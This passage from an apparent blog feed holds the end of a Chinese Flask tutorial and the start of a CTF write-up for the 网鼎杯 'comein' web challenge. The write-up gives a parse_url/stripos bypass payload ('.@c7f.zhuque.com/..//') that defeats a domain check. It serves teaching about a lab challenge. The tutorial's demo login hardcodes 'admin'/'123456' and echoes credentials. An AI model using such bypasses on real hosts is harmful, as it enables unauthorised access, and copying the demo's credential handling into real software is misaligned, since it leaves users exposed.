class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> article(</span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">int</span> primary <span class="keyword">key</span> auto_increment,</span><br><span class="line">    title <span class="built_in">varchar</span>(<span class="number">100</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">    <span class="keyword">content</span> <span class="built_in">text</span> <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>db_demo2.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_sqlalchemy <span class="keyword">import</span> SQLAlchemy</span><br><span class="line"><span class="keyword">import</span> config</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config.from_object(config)</span><br><span class="line"></span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Article</span><span class="params">(db.Model)</span>:</span></span><br><span class="line">    __tablename__ = <span class="string">'article'</span></span><br><span class="line">    id = db.Column(db.Integer,primary_key=<span class="keyword">True</span>,autoincrement=<span class="keyword">True</span>)</span><br><span class="line">    title = db.Column(db.String(<span class="number">100</span>),nullable=<span class="keyword">False</span>)</span><br><span class="line">    content = db.Column(db.Text,nullable=<span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line">db.create_all()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'index'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><h2 id="Flask-SQLAlchemy数据的增，删，改，查"><a href="#Flask-SQLAlchemy数据的增，删，改，查" class="headerlink" title="Flask-SQLAlchemy数据的增，删，改，查"></a>Flask-SQLAlchemy数据的增，删，改，查</h2><p>1.增：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article1 = Article(title=<span class="string">'aaa'</span>,content=<span class="string">'bbb'</span>)</span><br><span class="line">db.session.add(article1)</span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><p>2.查：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">article1 = Article.query.filter(Article.title == <span class="string">'aaa'</span>).first()</span><br><span class="line"><span class="keyword">print</span> <span class="string">'title:%s'</span> % article1.title</span><br><span class="line"><span class="keyword">print</span> <span class="string">'content:%s'</span> % article1.content</span><br></pre></td></tr></table></figure><p>3.改：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 先把你要更改的数据查找出来</span></span><br><span class="line">article1 = Article.query.filter(Article.title == <span class="string">'aaa'</span>).first()</span><br><span class="line"><span class="comment"># 把这条数据进行修改</span></span><br><span class="line">article1.title = <span class="string">'new title'</span></span><br><span class="line"><span class="comment"># 做事务的提交</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><p>4.删：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 把需要删除的数据查找出来</span></span><br><span class="line">article1 = Article.query.filter(Article.content == <span class="string">'bbb'</span>).first()</span><br><span class="line"><span class="comment"># 把这条数据删除掉</span></span><br><span class="line">db.session.delete(article1)</span><br><span class="line"><span class="comment"># 做事务的提交</span></span><br><span class="line">db.session.commit()</span><br></pre></td></tr></table></figure><h2 id="flask中的session工作机制"><a href="#flask中的session工作机制" class="headerlink" title="flask中的session工作机制"></a>flask中的session工作机制</h2><p>1.flask中的session机制是：把敏感数据经过加密后放入session中，然后再把session存放到cookie中，下次请求的时候，再把浏览器发送过来的cookie中读取session，然后再从session中读取敏感数据，并进行解密，获取最终的用户数据</p><p>2.flask的这种session机制，可以节省服务器的开销，因为把所有的信息都存储到了客户端（浏览器）</p><p>3.安全是相对的，把session放到cookie中，经过加密，也是比较安全的</p><h2 id="flask操作session"><a href="#flask操作session" class="headerlink" title="flask操作session"></a>flask操作session</h2><p>1.session的操作方式：</p><p>(1)使用session需要从flask中导入session，以后和session相关的操作都是通过这个变量来的</p><p>(2)使用session需要设置SECRET_KEY，作为加密用的，并且这个SECRET_KEY，如果每次服务器启动后都变化的话，那么之前的session就不能再通过当前这个SECRET_KEY就不能再进行解密了</p><p>(3)操作session的时候，跟操作字典是一样的</p><p>(4)添加session：session[‘username’]=’admin’</p><p>(5)删除：session.pop(‘username’)</p><p>(6)清除所有session：session.clear()</p><p>(7)获取session：session.get(‘username’)</p><p>例子：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,session</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>) <span class="comment">#设置随机24位字符串作为加密的盐</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    session[<span class="string">'username'</span>] = <span class="string">'admin'</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'hello'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/get/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> session.get(<span class="string">'username'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/delete/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> session.get(<span class="string">'username'</span>)</span><br><span class="line">    session.pop(<span class="string">'username'</span>)</span><br><span class="line">    <span class="keyword">print</span> session.get(<span class="string">'username'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'success'</span></span><br></pre></td></tr></table></figure><p>2.设置session过期时间</p><p>(1)如果没有指定session的过期时间，那么默认浏览器关闭后就自动结束</p><p>(2)如果设置了session的permanent属性为True，那么过期时间是31天</p><p>(3)可以通过给app.config设置PERMANENT_SESSION_LIFETIME来更改过期时间，这个值的数据类型是datetime.timedelay类型</p><h3 id="Flask实现GET和POST请求获取参数"><a href="#Flask实现GET和POST请求获取参数" class="headerlink" title="Flask实现GET和POST请求获取参数"></a>Flask实现GET和POST请求获取参数</h3><p>1.get请求是通过flask.request.args来获取</p><p>2.post请求是通过flask.request.form来获取</p><p>3.post请求在模板中要注意几点：</p><p>(1)input标签中，要写name来标识这个value的key，方便后台获取</p><p>(2)在写form表单的时候，要指定method=’post’，并且要指定action=’/login/‘</p><p>实例：</p><p>实现页面跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'get_post_demo.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/search/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'search'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'login'</span></span><br></pre></td></tr></table></figure><p>html代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;&#123; url_for('search',q='hello') &#125;&#125;"</span>&gt;</span>跳转到搜索页面<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>获取GET请求参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'get_post_demo.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/search/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">()</span>:</span></span><br><span class="line">    q = request.args.get(<span class="string">'q'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'get:%s'</span>%q</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'login'</span></span><br></pre></td></tr></table></figure><p>获取POST请求参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'get_post_demo.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/search/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">()</span>:</span></span><br><span class="line">    q = request.args.get(<span class="string">'q'</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'get:%s'</span>%q</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'username:%s password:%s'</span>%(username,password)</span><br></pre></td></tr></table></figure><p>html代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"&#123;&#123; url_for('login') &#125;&#125;"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>用户名：<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入用户名"</span> <span class="attr">name</span>=<span class="string">"username"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span>密码：<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">placeholder</span>=<span class="string">"请输入密码"</span> <span class="attr">name</span>=<span class="string">"password"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"登录"</span>&gt;</span><span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="保存全局变量的g属性"><a href="#保存全局变量的g属性" class="headerlink" title="保存全局变量的g属性"></a>保存全局变量的g属性</h3><p>g:global</p><p>1.g对象是专门用来保存用户的数据</p><p>2.g对象在一次请求中的所有的代码的地方，都是可以使用的</p><h3 id="钩子函数-hook"><a href="#钩子函数-hook" class="headerlink" title="钩子函数(hook)"></a>钩子函数(hook)</h3><p>1.before_request:在请求之前执行的，即在视图函数执行之前执行的，这个函数只是一个装饰器，他可以把需要设置为钩子函数的代码放到视图函数执行之前来执行</p><p>示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,session,g,redirect,url_for</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">'SECRET_KEY'</span>] = os.urandom(<span class="number">24</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'get_post_demo.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">'GET'</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">'login.html'</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">'POST'</span>:</span><br><span class="line">        username = request.form.get(<span class="string">'username'</span>)</span><br><span class="line">        password = request.form.get(<span class="string">'password'</span>)</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">'admin'</span> <span class="keyword">and</span> password == <span class="string">'123456'</span>:</span><br><span class="line">            session[<span class="string">'username'</span>] = username</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u'登录成功'</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">u'用户名或密码错误'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/edit/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> hasattr(g,<span class="string">'username'</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">u'修改成功'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">'login'</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">before_request</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">'username'</span>):</span><br><span class="line">        g.username = session.get(<span class="string">'username'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>2.context_processor:</p><p>(1)上下文处理器应该返回一个字典，字典中的key会被模板中当成变量来渲染</p><p>(2)上下文处理器中返回的字典，在所有页面中都是可用的</p><p>示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.context_processor</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_context_processor</span><span class="params">()</span>:</span></span><br><span class="line">    username = session.get(<span class="string">'username'</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">'username'</span>:username&#125;</span><br></pre></td></tr></table></figure><p>视频学习地址：<a href="https://study.163.com/course/courseLearn.htm?courseId=1004091002&amp;from=study#/learn/video?lessonId=1052294587&amp;courseId=1004091002" target="_blank" rel="noopener">flask视频学习</a></p>]]></content>
    
    <summary type="html">
    
      Python
    
    </summary>
    
      <category term="Python" scheme="https://Foxgrin.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://Foxgrin.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>网鼎杯第三场Web</title>
    <link href="https://Foxgrin.github.io//posts/25445/"/>
    <id>https://Foxgrin.github.io//posts/25445/</id>
    <published>2018-09-04T10:45:00.000Z</published>
    <updated>2018-09-04T13:24:41.598Z</updated>
    
    <content type="html"><![CDATA[<p>2018年网鼎杯第三场Web题解<a id="more"></a></p><h3 id="comein"><a href="#comein" class="headerlink" title="comein"></a>comein</h3><p>题目：由于运维人员失误，内网认证页面部署至了外网，不过还好，开发加了域名验证。 </p><p>做的时候服务器已经关闭了，获取源代码本地测试(PS:文件名为index.php，文件放在根目录下，浏览器输入localhost访问)</p><p>源代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="number">0</span>);</span><br><span class="line">$uri = $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="keyword">if</span>(stripos($uri,<span class="string">"."</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Unknow URI."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!parse_url($uri,PHP_URL_HOST))&#123;</span><br><span class="line">$uri = <span class="string">"http://"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$host = parse_url($uri,PHP_URL_HOST);</span><br><span class="line"><span class="keyword">if</span>($host === <span class="string">"c7f.zhuque.com"</span>)&#123;</span><br><span class="line">setcookie(<span class="string">"AuthFlag"</span>,<span class="string">"flag&#123;***&#125;"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源代码看出，要绕过stripos函数的检测，首先我们要弄清楚全局变量$_SERVER[‘REQUEST_URI’]</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/2.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可见返回的是url中/后面的内容</p><p>parse_url函数作用是截取url中的指定部分，PHP_URL_HOST是截取url中的主机信息部分</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url, PHP_URL_SCHEME));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_USER));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_PASS));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_HOST));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_PORT));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_PATH));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_QUERY));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(parse_url($url, PHP_URL_FRAGMENT));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>执行结果：</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/1.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>可以看出parse_url($url, PHP_URL_HOST)截取的是@后面的hostname</p><p>最后要获取flag条件是截取的hostname等于c7f.zhuque.com，所以构造payload:<a href="mailto:.@c7f.zhuque.com" target="_blank" rel="noopener">.@c7f.zhuque.com</a>/..//</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/网鼎杯第三场Web/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>最前面的.是为了绕过stripos函数，位置为0就不会执行die函数</p><p>本地测试代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>,<span class="number">0</span>);</span><br><span class="line">$uri = $_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$uri = '</span>.$uri.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(stripos($uri,<span class="string">"."</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Unknow URI."</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'stripos($uri,".") = '</span>.stripos($uri,<span class="string">"."</span>).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"parse_url($uri,PHP_URL_HOST) = "</span>.parse_url($uri,PHP_URL_HOST).<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span>(!parse_url($uri,PHP_URL_HOST))&#123;</span><br><span class="line">$uri = <span class="string">"http://"</span>.$_SERVER[<span class="string">'REMOTE_ADDR'</span>].$_SERVER[<span class="string">'REQUEST_URI'</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'$uri = '</span>.$uri.<span class="string">"&lt;br&gt;"</span>;</span><br><span 